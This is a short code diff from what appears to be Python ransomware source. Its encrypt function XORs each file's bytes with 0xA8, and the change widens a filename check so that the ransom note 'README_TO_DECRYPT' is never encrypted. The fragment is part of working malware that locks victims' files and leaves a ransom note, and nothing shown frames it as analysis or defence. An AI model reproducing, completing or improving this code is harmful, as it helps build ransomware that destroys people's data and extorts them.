@@ -19,7 +19,7 @@ def xord(data):
 
 #It will XOR the data from a file once with b^0xA8
 def encrypt(file):
-    if os.path.splitext(file)[0] == "README_TO_DECRYPT" or os.path.splitext(file)[0] == "README_TO_DECRYPT.txt":
+    if "README_TO_DECRYPT" in os.path.splitext(file)[0]:
         pass
     else:
         try:
